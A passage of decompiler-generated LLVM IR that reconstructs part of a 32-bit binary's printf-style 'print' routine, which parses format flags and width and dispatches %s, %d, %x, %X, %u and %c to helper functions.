dec_label_pc_8048597:                             ; preds = %dec_label_pc_8048497, %dec_label_pc_804857b
  %storemerge = phi i32 [ %v2_8048592, %dec_label_pc_804857b ], [ %v6_80484ac, %dec_label_pc_8048497 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_8048516, { 0, 1, 3, 2 }
  uselistorder i8 %v5_8048501, { 1, 0 }
  uselistorder i64 %v6_80484fc, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048597, { 1, 0 }
  uselistorder label %dec_label_pc_804857b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048516, { 1, 0 }
  uselistorder label %dec_label_pc_80484ee, { 1, 0 }
  uselistorder label %dec_label_pc_80484dd, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804859c = load i32, i32* @ebp, align 4
  store i32 %v0_804859c, i32* %stack_var_-4, align 4
  %v15_804859f = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048791 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_80487c745 = load i8, i8* %stack_var_8.444, align 1
  %v3_80487c746 = zext i8 %v2_80487c745 to i32
  %v5_80487c747 = and i32 %arg2, -256
  %v6_80487c748 = or i32 %v3_80487c746, %v5_80487c747
  store i32 %v6_80487c748, i32* %eax.global-to-local, align 4
  %v4_80487c949 = icmp eq i8 %v2_80487c745, 0
  %v1_80487cb50 = icmp eq i1 %v4_80487c949, false
  br i1 %v1_80487cb50, label %dec_label_pc_80485ae, label %dec_label_pc_80487d1

dec_label_pc_80485ae:                             ; preds = %entry, %dec_label_pc_80487c1
  %v0_80487af = phi i32 [ %v4_804867366, %dec_label_pc_80487c1 ], [ %v15_804859f, %entry ]
  %v5_80487c756 = phi i32 [ %v5_80487c7, %dec_label_pc_80487c1 ], [ %v5_80487c747, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_80487c1 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_80487c1 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_80487c1, %dec_label_pc_80487c1 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_80487c1 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_80487c1 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_80485b1 = load i8, i8* %stack_var_8.455, align 1
  %v3_80485b1 = zext i8 %v2_80485b1 to i32
  %v6_80485b1 = or i32 %v3_80485b1, %v5_80487c756
  store i32 %v6_80485b1, i32* %eax.global-to-local, align 4
  %v10_80485b3 = icmp eq i8 %v2_80485b1, 37
  %v1_80485b5 = icmp eq i1 %v10_80485b3, false
  br i1 %v1_80485b5, label %dec_label_pc_80487a5, label %dec_label_pc_80485bb

dec_label_pc_80485bb:                             ; preds = %dec_label_pc_80485ae
  %v5_80485bb = add i32 %stack_var_8.4.in53, 1
  %v22_80485bb = inttoptr i32 %v5_80485bb to i8*
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485ce = load i8, i8* %v22_80485bb, align 1
  %v3_80485ce = zext i8 %v2_80485ce to i32
  %v5_80485ce = and i32 %v5_80485bb, -256
  %v6_80485ce = or i32 %v3_80485ce, %v5_80485ce
  store i32 %v6_80485ce, i32* %eax.global-to-local, align 4
  %v4_80485d0 = icmp eq i8 %v2_80485ce, 0
  br i1 %v4_80485d0, label %dec_label_pc_80487d1, label %dec_label_pc_80485d8

dec_label_pc_80485d8:                             ; preds = %dec_label_pc_80485bb
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485db = load i8, i8* %v22_80485bb, align 1
  %v3_80485db = zext i8 %v2_80485db to i32
  %v6_80485db = or i32 %v3_80485db, %v5_80485ce
  store i32 %v6_80485db, i32* %eax.global-to-local, align 4
  %v10_80485dd = icmp eq i8 %v2_80485db, 37
  br i1 %v10_80485dd, label %dec_label_pc_80487a5, label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485d8
  store i32 %v5_80485bb, i32* %eax.global-to-local, align 4
  %v2_80485e8 = load i8, i8* %v22_80485bb, align 1
  %v3_80485e8 = zext i8 %v2_80485e8 to i32
  %v6_80485e8 = or i32 %v3_80485e8, %v5_80485ce
  store i32 %v6_80485e8, i32* %eax.global-to-local, align 4
  %v10_80485ea = icmp eq i8 %v2_80485e8, 45
  %v1_80485ec = icmp eq i1 %v10_80485ea, false
  br i1 %v1_80485ec, label %dec_label_pc_8048601.preheader, label %dec_label_pc_80485ee

dec_label_pc_80485ee:                             ; preds = %dec_label_pc_80485e5
  %v5_80485ee = add i32 %stack_var_8.4.in53, 2
  %v22_80485ee = inttoptr i32 %v5_80485ee to i8*
  br label %dec_label_pc_8048601.preheader

dec_label_pc_8048601.preheader:                   ; preds = %dec_label_pc_80485ee, %dec_label_pc_80485e5
  %stack_var_8.0.ph = phi i8* [ %v22_80485bb, %dec_label_pc_80485e5 ], [ %v22_80485ee, %dec_label_pc_80485ee ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 1, %dec_label_pc_80485ee ]
  %v4_804860115 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_804860115, i32* %eax.global-to-local, align 4
  %v2_804860416 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_804860417 = zext i8 %v2_804860416 to i32
  %v5_804860418 = and i32 %v4_804860115, -256
  %v6_804860419 = or i32 %v3_804860417, %v5_804860418
  store i32 %v6_804860419, i32* %eax.global-to-local, align 4
  %v7_804860621 = icmp eq i8 %v2_804860416, 48
  br i1 %v7_804860621, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_80485fa:                             ; preds = %dec_label_pc_8048601.preheader, %dec_label_pc_80485fa
  %v4_804860123 = phi i32 [ %v5_80485fa, %dec_label_pc_80485fa ], [ %v4_804860115, %dec_label_pc_8048601.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_80485fd, %dec_label_pc_80485fa ], [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ]
  %v5_80485fa = add i32 %v4_804860123, 1
  %v22_80485fa = inttoptr i32 %v5_80485fa to i8*
  %v4_80485fd = or i32 %stack_var_-32.022, 2
  store i32 %v5_80485fa, i32* %eax.global-to-local, align 4
  %v2_8048604 = load i8, i8* %v22_80485fa, align 1
  %v3_8048604 = zext i8 %v2_8048604 to i32
  %v5_8048604 = and i32 %v5_80485fa, -256
  %v6_8048604 = or i32 %v3_8048604, %v5_8048604
  store i32 %v6_8048604, i32* %eax.global-to-local, align 4
  %v7_8048606 = icmp eq i8 %v2_8048604, 48
  br i1 %v7_8048606, label %dec_label_pc_80485fa, label %dec_label_pc_8048630.preheader

dec_label_pc_8048630.preheader:                   ; preds = %dec_label_pc_80485fa, %dec_label_pc_8048601.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_8048601.preheader ], [ %v4_80485fd, %dec_label_pc_80485fa ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_8048601.preheader ], [ %v22_80485fa, %dec_label_pc_80485fa ]
  %v4_804863025 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_804863025, i32* %eax.global-to-local, align 4
  %v2_804863326 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_804863327 = zext i8 %v2_804863326 to i32
  %v5_804863328 = and i32 %v4_804863025, -256
  %v6_804863329 = or i32 %v3_804863327, %v5_804863328
  store i32 %v6_804863329, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_804863326, 48
  br i1 %tmp67, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_804860c:                             ; preds = %dec_label_pc_8048639
  %v2_8048615 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804861d = load i8, i8* %stack_var_8.133, align 1
  %v3_804861d = zext i8 %v2_804861d to i32
  %v5_8048624 = add i32 %v3_804861d, %v2_8048615
  %v1_8048627 = add i32 %v5_8048624, -48
  %v5_804862d = add i32 %v4_804863034, 1
  %v22_804862d = inttoptr i32 %v5_804862d to i8*
  store i32 %v5_804862d, i32* %eax.global-to-local, align 4
  %v2_8048633 = load i8, i8* %v22_804862d, align 1
  %v3_8048633 = zext i8 %v2_8048633 to i32
  %v5_8048633 = and i32 %v5_804862d, -256
  %v6_8048633 = or i32 %v3_8048633, %v5_8048633
  store i32 %v6_8048633, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_8048633, 48
  br i1 %tmp68, label %dec_label_pc_8048642, label %dec_label_pc_8048639

dec_label_pc_8048639:                             ; preds = %dec_label_pc_8048630.preheader, %dec_label_pc_804860c
  %v5_804863335 = phi i32 [ %v5_8048633, %dec_label_pc_804860c ], [ %v5_804863328, %dec_label_pc_8048630.preheader ]
  %v4_804863034 = phi i32 [ %v5_804862d, %dec_label_pc_804860c ], [ %v4_804863025, %dec_label_pc_8048630.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_804862d, %dec_label_pc_804860c ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_8048627, %dec_label_pc_804860c ], [ 0, %dec_label_pc_8048630.preheader ]
  store i32 %v4_804863034, i32* %eax.global-to-local, align 4
  %v2_804863c = load i8, i8* %stack_var_8.133, align 1
  %v3_804863c = zext i8 %v2_804863c to i32
  %v6_804863c = or i32 %v3_804863c, %v5_804863335
  store i32 %v6_804863c, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_804863c, 58
  br i1 %tmp69, label %dec_label_pc_804860c, label %dec_label_pc_8048642

dec_label_pc_8048642:                             ; preds = %dec_label_pc_804860c, %dec_label_pc_8048639, %dec_label_pc_8048630.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_8048630.preheader ], [ %stack_var_-36.032, %dec_label_pc_8048639 ], [ %v1_8048627, %dec_label_pc_804860c ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_8048630.preheader ], [ %stack_var_8.133, %dec_label_pc_8048639 ], [ %v22_804862d, %dec_label_pc_804860c ]
  %v4_8048630.lcssa = phi i32 [ %v4_804863025, %dec_label_pc_8048630.preheader ], [ %v4_804863034, %dec_label_pc_8048639 ], [ %v5_804862d, %dec_label_pc_804860c ]
  %v5_8048633.lcssa = phi i32 [ %v5_804863328, %dec_label_pc_8048630.preheader ], [ %v5_804863335, %dec_label_pc_8048639 ], [ %v5_8048633, %dec_label_pc_804860c ]
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048645 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048645 = zext i8 %v2_8048645 to i32
  %v6_8048645 = or i32 %v3_8048645, %v5_8048633.lcssa
  store i32 %v6_8048645, i32* %eax.global-to-local, align 4
  %v10_8048647 = icmp eq i8 %v2_8048645, 115
  %v1_8048649 = icmp eq i1 %v10_8048647, false
  br i1 %v1_8048649, label %dec_label_pc_804868d, label %dec_label_pc_804864b

dec_label_pc_804864b:                             ; preds = %dec_label_pc_8048642
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804864e = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048656 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048656 = load i32, i32* %v1_8048656, align 4
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v4_804865b = icmp eq i32 %v2_8048656, 0
  br i1 %v4_804865b, label %dec_label_pc_8048670, label %dec_label_pc_8048661

dec_label_pc_8048661:                             ; preds = %dec_label_pc_804864b
  store i32 %v2_8048656, i32* %eax.global-to-local, align 4
  %v5_8048664 = inttoptr i32 %v2_8048656 to i8*
  br label %dec_label_pc_8048670

dec_label_pc_8048670:                             ; preds = %dec_label_pc_804864b, %dec_label_pc_8048661
  %storemerge = phi i8* [ %v5_8048664, %dec_label_pc_8048661 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8057afb.12, i32 0, i32 0), %dec_label_pc_804864b ]
  %v4_8048670 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048670, i32* %eax.global-to-local, align 4
  %v5_8048673 = add i32 %v0_80487af, -4
  %v6_8048673 = inttoptr i32 %v5_8048673 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048673, align 4
  %v5_8048676 = add i32 %v0_80487af, -8
  %v6_8048676 = inttoptr i32 %v5_8048676 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048676, align 4
  %v0_8048679 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048679 = add i32 %v0_80487af, -12
  %v3_8048679 = inttoptr i32 %v2_8048679 to i32*
  store i32 %v0_8048679, i32* %v3_8048679, align 4
  %v5_804867a = add i32 %v0_80487af, -16
  %v6_804867a = inttoptr i32 %v5_804867a to i32*
  store i32 %tmp3, i32* %v6_804867a, align 4
  %v5_804867d = inttoptr i32 %stack_var_-36.0.lcssa to i8*
  %v6_804867d = call i32 @prints(i32 %v4_8048670, i8* %v5_804867d, i32 %stack_var_-32.0.lcssa, i32 %stack_var_-28.154)
  store i32 %v6_804867d, i32* %eax.global-to-local, align 4
  %v0_8048682 = load i32, i32* @esp, align 4
  %v1_8048682 = add i32 %v0_8048682, 16
  %v5_8048685 = add i32 %v6_804867d, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048642
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048690 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048690 = zext i8 %v2_8048690 to i32
  %v6_8048690 = or i32 %v3_8048690, %v5_8048633.lcssa
  store i32 %v6_8048690, i32* %eax.global-to-local, align 4
  %v10_8048692 = icmp eq i8 %v2_8048690, 100
  %v1_8048694 = icmp eq i1 %v10_8048692, false
  br i1 %v1_8048694, label %dec_label_pc_80486c6, label %dec_label_pc_8048696

dec_label_pc_8048696:                             ; preds = %dec_label_pc_804868d
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048699 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486a1 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486a1 = load i32, i32* %v1_80486a1, align 4
  store i32 %v2_80486a1, i32* %eax.global-to-local, align 4
  %v1_80486a6 = add i32 %v0_80487af, -8
  %v2_80486a6 = inttoptr i32 %v1_80486a6 to i32*
  store i32 97, i32* %v2_80486a6, align 4
  %v5_80486a8 = add i32 %v0_80487af, -12
  %v6_80486a8 = inttoptr i32 %v5_80486a8 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486a8, align 4
  %v5_80486ab = add i32 %v0_80487af, -16
  %v6_80486ab = inttoptr i32 %v5_80486ab to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486ab, align 4
  %v1_80486ae = add i32 %v0_80487af, -20
  %v2_80486ae = inttoptr i32 %v1_80486ae to i32*
  store i32 1, i32* %v2_80486ae, align 4
  %v1_80486b0 = add i32 %v0_80487af, -24
  %v2_80486b0 = inttoptr i32 %v1_80486b0 to i32*
  store i32 10, i32* %v2_80486b0, align 4
  %v0_80486b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80486b2 = add i32 %v0_80487af, -28
  %v3_80486b2 = inttoptr i32 %v2_80486b2 to i32*
  store i32 %v0_80486b2, i32* %v3_80486b2, align 4
  %v5_80486b3 = add i32 %v0_80487af, -32
  %v6_80486b3 = inttoptr i32 %v5_80486b3 to i32*
  store i32 %tmp3, i32* %v6_80486b3, align 4
  %v1_80486b6 = call i32 @printi(i32 %v1_8048699)
  store i32 %v1_80486b6, i32* %eax.global-to-local, align 4
  %v0_80486bb = load i32, i32* @esp, align 4
  %v1_80486bb = add i32 %v0_80486bb, 32
  %v5_80486be = add i32 %v1_80486b6, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486c6:                             ; preds = %dec_label_pc_804868d
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486c9 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486c9 = zext i8 %v2_80486c9 to i32
  %v6_80486c9 = or i32 %v3_80486c9, %v5_8048633.lcssa
  store i32 %v6_80486c9, i32* %eax.global-to-local, align 4
  %v10_80486cb = icmp eq i8 %v2_80486c9, 120
  %v1_80486cd = icmp eq i1 %v10_80486cb, false
  br i1 %v1_80486cd, label %dec_label_pc_80486ff, label %dec_label_pc_80486cf

dec_label_pc_80486cf:                             ; preds = %dec_label_pc_80486c6
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486d2 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486da = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486da = load i32, i32* %v1_80486da, align 4
  store i32 %v2_80486da, i32* %eax.global-to-local, align 4
  %v1_80486df = add i32 %v0_80487af, -8
  %v2_80486df = inttoptr i32 %v1_80486df to i32*
  store i32 97, i32* %v2_80486df, align 4
  %v5_80486e1 = add i32 %v0_80487af, -12
  %v6_80486e1 = inttoptr i32 %v5_80486e1 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_80486e1, align 4
  %v5_80486e4 = add i32 %v0_80487af, -16
  %v6_80486e4 = inttoptr i32 %v5_80486e4 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_80486e4, align 4
  %v1_80486e7 = add i32 %v0_80487af, -20
  %v2_80486e7 = inttoptr i32 %v1_80486e7 to i32*
  store i32 0, i32* %v2_80486e7, align 4
  %v1_80486e9 = add i32 %v0_80487af, -24
  %v2_80486e9 = inttoptr i32 %v1_80486e9 to i32*
  store i32 16, i32* %v2_80486e9, align 4
  %v0_80486eb = load i32, i32* %eax.global-to-local, align 4
  %v2_80486eb = add i32 %v0_80487af, -28
  %v3_80486eb = inttoptr i32 %v2_80486eb to i32*
  store i32 %v0_80486eb, i32* %v3_80486eb, align 4
  %v5_80486ec = add i32 %v0_80487af, -32
  %v6_80486ec = inttoptr i32 %v5_80486ec to i32*
  store i32 %tmp3, i32* %v6_80486ec, align 4
  %v1_80486ef = call i32 @printi(i32 %v1_80486d2)
  store i32 %v1_80486ef, i32* %eax.global-to-local, align 4
  %v0_80486f4 = load i32, i32* @esp, align 4
  %v1_80486f4 = add i32 %v0_80486f4, 32
  %v5_80486f7 = add i32 %v1_80486ef, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80486ff:                             ; preds = %dec_label_pc_80486c6
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048702 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048702 = zext i8 %v2_8048702 to i32
  %v6_8048702 = or i32 %v3_8048702, %v5_8048633.lcssa
  store i32 %v6_8048702, i32* %eax.global-to-local, align 4
  %v10_8048704 = icmp eq i8 %v2_8048702, 88
  %v1_8048706 = icmp eq i1 %v10_8048704, false
  br i1 %v1_8048706, label %dec_label_pc_8048738, label %dec_label_pc_8048708

dec_label_pc_8048708:                             ; preds = %dec_label_pc_80486ff
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804870b = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048713 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048713 = load i32, i32* %v1_8048713, align 4
  store i32 %v2_8048713, i32* %eax.global-to-local, align 4
  %v1_8048718 = add i32 %v0_80487af, -8
  %v2_8048718 = inttoptr i32 %v1_8048718 to i32*
  store i32 65, i32* %v2_8048718, align 4
  %v5_804871a = add i32 %v0_80487af, -12
  %v6_804871a = inttoptr i32 %v5_804871a to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804871a, align 4
  %v5_804871d = add i32 %v0_80487af, -16
  %v6_804871d = inttoptr i32 %v5_804871d to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804871d, align 4
  %v1_8048720 = add i32 %v0_80487af, -20
  %v2_8048720 = inttoptr i32 %v1_8048720 to i32*
  store i32 0, i32* %v2_8048720, align 4
  %v1_8048722 = add i32 %v0_80487af, -24
  %v2_8048722 = inttoptr i32 %v1_8048722 to i32*
  store i32 16, i32* %v2_8048722, align 4
  %v0_8048724 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048724 = add i32 %v0_80487af, -28
  %v3_8048724 = inttoptr i32 %v2_8048724 to i32*
  store i32 %v0_8048724, i32* %v3_8048724, align 4
  %v5_8048725 = add i32 %v0_80487af, -32
  %v6_8048725 = inttoptr i32 %v5_8048725 to i32*
  store i32 %tmp3, i32* %v6_8048725, align 4
  %v1_8048728 = call i32 @printi(i32 %v1_804870b)
  store i32 %v1_8048728, i32* %eax.global-to-local, align 4
  %v0_804872d = load i32, i32* @esp, align 4
  %v1_804872d = add i32 %v0_804872d, 32
  %v5_8048730 = add i32 %v1_8048728, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_8048738:                             ; preds = %dec_label_pc_80486ff
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_804873b = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_804873b = zext i8 %v2_804873b to i32
  %v6_804873b = or i32 %v3_804873b, %v5_8048633.lcssa
  store i32 %v6_804873b, i32* %eax.global-to-local, align 4
  %v10_804873d = icmp eq i8 %v2_804873b, 117
  %v1_804873f = icmp eq i1 %v10_804873d, false
  br i1 %v1_804873f, label %dec_label_pc_804876e, label %dec_label_pc_8048741

dec_label_pc_8048741:                             ; preds = %dec_label_pc_8048738
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_8048744 = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_804874c = inttoptr i32 %stack_var_12.152 to i32*
  %v2_804874c = load i32, i32* %v1_804874c, align 4
  store i32 %v2_804874c, i32* %eax.global-to-local, align 4
  %v1_8048751 = add i32 %v0_80487af, -8
  %v2_8048751 = inttoptr i32 %v1_8048751 to i32*
  store i32 97, i32* %v2_8048751, align 4
  %v5_8048753 = add i32 %v0_80487af, -12
  %v6_8048753 = inttoptr i32 %v5_8048753 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048753, align 4
  %v5_8048756 = add i32 %v0_80487af, -16
  %v6_8048756 = inttoptr i32 %v5_8048756 to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_8048756, align 4
  %v1_8048759 = add i32 %v0_80487af, -20
  %v2_8048759 = inttoptr i32 %v1_8048759 to i32*
  store i32 0, i32* %v2_8048759, align 4
  %v1_804875b = add i32 %v0_80487af, -24
  %v2_804875b = inttoptr i32 %v1_804875b to i32*
  store i32 10, i32* %v2_804875b, align 4
  %v0_804875d = load i32, i32* %eax.global-to-local, align 4
  %v2_804875d = add i32 %v0_80487af, -28
  %v3_804875d = inttoptr i32 %v2_804875d to i32*
  store i32 %v0_804875d, i32* %v3_804875d, align 4
  %v5_804875e = add i32 %v0_80487af, -32
  %v6_804875e = inttoptr i32 %v5_804875e to i32*
  store i32 %tmp3, i32* %v6_804875e, align 4
  %v1_8048761 = call i32 @printi(i32 %v1_8048744)
  store i32 %v1_8048761, i32* %eax.global-to-local, align 4
  %v0_8048766 = load i32, i32* @esp, align 4
  %v1_8048766 = add i32 %v0_8048766, 32
  %v5_8048769 = add i32 %v1_8048761, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_804876e:                             ; preds = %dec_label_pc_8048738
  store i32 %v4_8048630.lcssa, i32* %eax.global-to-local, align 4
  %v2_8048771 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_8048771 = zext i8 %v2_8048771 to i32
  %v6_8048771 = or i32 %v3_8048771, %v5_8048633.lcssa
  store i32 %v6_8048771, i32* %eax.global-to-local, align 4
  %v10_8048773 = icmp eq i8 %v2_8048771, 99
  %v1_8048775 = icmp eq i1 %v10_8048773, false
  br i1 %v1_8048775, label %dec_label_pc_80487c1, label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_804876e
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_804877a = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_8048782 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_8048782 = load i32, i32* %v1_8048782, align 4
  store i32 %v2_8048782, i32* %stack_var_-6, align 4
  %v5_804878b = add i32 %v0_80487af, -4
  %v6_804878b = inttoptr i32 %v5_804878b to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_804878b, align 4
  %v5_804878e = add i32 %v0_80487af, -8
  %v6_804878e = inttoptr i32 %v5_804878e to i32*
  store i32 %stack_var_-36.0.lcssa, i32* %v6_804878e, align 4
  store i32 %v2_8048791, i32* %eax.global-to-local, align 4
  %v2_8048794 = add i32 %v0_80487af, -12
  %v3_8048794 = inttoptr i32 %v2_8048794 to i32*
  store i32 %v2_8048791, i32* %v3_8048794, align 4
  %v5_8048795 = add i32 %v0_80487af, -16
  %v6_8048795 = inttoptr i32 %v5_8048795 to i32*
  store i32 %tmp3, i32* %v6_8048795, align 4
  %v0_8048798 = load i32, i32* %stack_var_-6, align 4
  %v6_8048798 = call i32 @prints(i32 %v0_8048798, i8* null, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8048798, i32* %eax.global-to-local, align 4
  %v0_804879d = load i32, i32* @esp, align 4
  %v1_804879d = add i32 %v0_804879d, 16
  %v5_80487a0 = add i32 %v6_8048798, %stack_var_-28.154
  br label %dec_label_pc_80487c1

dec_label_pc_80487a5:                             ; preds = %dec_label_pc_80485d8, %dec_label_pc_80485ae
  %stack_var_8.2 = phi i8* [ %stack_var_8.455, %dec_label_pc_80485ae ], [ %v22_80485bb, %dec_label_pc_80485d8 ]
  %v4_80487a5 = ptrtoint i8* %stack_var_8.2 to i32
  store i32 %v4_80487a5, i32* %eax.global-to-local, align 4
  %v2_80487a8 = load i8, i8* %stack_var_8.2, align 1
  %v3_80487a8 = zext i8 %v2_80487a8 to i32
  store i32 %v3_80487a8, i32* %eax.global-to-local, align 4
  %v2_80487b2 = add i32 %v0_80487af, -12
  %v3_80487b2 = inttoptr i32 %v2_80487b2 to i32*
  store i32 %v3_80487a8, i32* %v3_80487b2, align 4
  %v5_80487b3 = add i32 %v0_80487af, -16
  %v6_80487b3 = inttoptr i32 %v5_80487b3 to i32*
  store i32 %tmp3, i32* %v6_80487b3, align 4
  %v2_80487b6 = inttoptr i32 %stack_var_-28.154 to i32*
  %v3_80487b6 = call i32 @printchar(i32* %v2_80487b6, i32 %stack_var_-24.151)
  store i32 %v3_80487b6, i32* %eax.global-to-local, align 4
  %v0_80487bb = load i32, i32* @esp, align 4
  %v1_80487bb = add i32 %v0_80487bb, 16
  %v4_80487be = add i32 %stack_var_-28.154, 1
  br label %dec_label_pc_80487c1

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_804876e, %dec_label_pc_8048777, %dec_label_pc_8048741, %dec_label_pc_8048708, %dec_label_pc_8048670, %dec_label_pc_80486cf, %dec_label_pc_8048696, %dec_label_pc_80487a5
  %v4_804867366 = phi i32 [ %v1_80487bb, %dec_label_pc_80487a5 ], [ %v0_80487af, %dec_label_pc_804876e ], [ %v1_804879d, %dec_label_pc_8048777 ], [ %v1_8048766, %dec_label_pc_8048741 ], [ %v1_804872d, %dec_label_pc_8048708 ], [ %v1_80486f4, %dec_label_pc_80486cf ], [ %v1_80486bb, %dec_label_pc_8048696 ], [ %v1_8048682, %dec_label_pc_8048670 ]
  %stack_var_-24.0 = phi i32 [ %stack_var_-24.151, %dec_label_pc_80487a5 ], [ %stack_var_-24.151, %dec_label_pc_804876e ], [ %stack_var_-24.151, %dec_label_pc_8048777 ], [ %stack_var_-24.151, %dec_label_pc_8048741 ], [ %stack_var_-24.151, %dec_label_pc_8048708 ], [ %stack_var_-24.151, %dec_label_pc_80486cf ], [ %stack_var_-24.151, %dec_label_pc_8048696 ], [ %v2_8048656, %dec_label_pc_8048670 ]
